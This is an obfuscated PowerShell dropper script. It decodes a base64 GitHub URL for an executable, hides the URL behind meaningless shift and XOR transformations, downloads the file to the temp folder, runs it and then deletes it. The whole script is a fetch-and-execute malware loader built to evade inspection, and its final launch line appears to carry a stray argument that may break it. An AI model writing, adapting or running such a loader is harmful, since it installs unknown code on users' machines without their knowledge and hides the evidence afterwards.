$asdfewvvbqrrqwe = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"

function 655465566555 {
    param (
        [string]$54643554yt5y
    )
    try {
        return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($54643554yt5y))
    } catch {
        Write-Error "Failed : $_"
        return $null
    }
}

$56fgdsargyh54-4t345tq34tgf = 655465566555 -54643554yt5y $asdfewvvbqrrqwe

function 43ftg2354tv25 {
    param (
        [string]$4t345tq34tgf
    )
    try {
        $34ft2354f2g45gy = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($4t345tq34tgf))
        $t354gt254ygh66 = New-Object System.Net.WebClient
        $t354gt254ygh66.DownloadFile($4t345tq34tgf, $34ft2354f2g45gy)
        return $34ft2354f2g45gy
    } catch {
        Write-Error "Failed: $_"
        return $null
    }
}

function t3245t3452t5 {
    param (
        [string]$g54t234ghy45y5h
    )
    try {
        Start-Process -FilePath $g54t234ghy45y5h -NoNewWindow -Wait
    } catch {
        Write-Error "Failed: $_"
    }
}

function 4ft324gft567y6 {
    param (
        [string]$5yt345g345
    )
    try {
        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($5yt345g345)
        $4f3tf234t2547677 = ""
        foreach ($ch4r in $ch4rs) {
            $4f3tf234t2547677 += [char]($ch4r + 1)
        }
        return $4f3tf234t2547677
    } catch {
        Write-Error "Failed: $_"
        return $null
    }
}

function 45t345ty245gy455565656 {
    param (
        [string]$5yt345g345
    )
    try {
        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($5yt345g345)
        $ty45gy345y366h767 = ""
        foreach ($ch4r in $ch4rs) {
            $ty45gy345y366h767 += [char]($ch4r - 1)
        }
        return $ty45gy345y366h767
    } catch {
        Write-Error "Failed: $_"
        return $null
    }
}

function 4ft235ty6667 {
    param (
        [string]$5yt345g345,
        [int]$4tf345tg56566
    )
    try {
        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($5yt345g345)
        $4f3tf234t2547677 = ""
        for ($i = 0; $i -lt $ch4rs.Length; $i++) {
            $4f3tf234t2547677 += [char]($ch4rs[$i] -bxor $4tf345tg56566)
        }
        return $4f3tf234t2547677
    } catch {
        Write-Error "Failed: $_"
        return $null
    }
}

function 45t2435gy56566 {
    param (
        [string]$5yt345g345,
        [int]$4tf345tg56566
    )
    try {
        $ch4rs = [System.Text.Encoding]::UTF8.GetBytes($5yt345g345)
        $ty45gy345y366h767 = ""
        for ($i = 0; $i -lt $ch4rs.Length; $i++) {
            $ty45gy345y366h767 += [char]($ch4rs[$i] -bxor $4tf345tg56566)
        }
        return $ty45gy345y366h767
    } catch {
        Write-Error "Failed: $_"
        return $null
    }
}

$3nc0d3d-4t345tq34tgf = 4ft324gft567y6 -5yt345g345 $56fgdsargyh54-4t345tq34tgf

$t5g4t54g435h6hy-4t345tq34tgf = 4ft235ty6667 -5yt345g345 $3nc0d3d-4t345tq34tgf -4tf345tg56566 5

$y756hu7j7j788787-4t345tq34tgf = 45t2435gy56566 -5yt345g345 $t5g4t54g435h6hy-4t345tq34tgf -4tf345tg56566 5

$56fgdsargyh54-4t345tq34tgf = 45t345ty245gy455565656 -5yt345g345 $y756hu7j7j788787-4t345tq34tgf

$g54t234ghy45y5h = 43ftg2354tv25 -4t345tq34tgf $56fgdsargyh54-4t345tq34tgf

if ($g54t234ghy45y5h) {

    Invoke-Expression "t3245t3452t5 43t23gf255g656h `"$g54t234ghy45y5h`""

    Remove-Item -Path $g54t234ghy45y5h
}
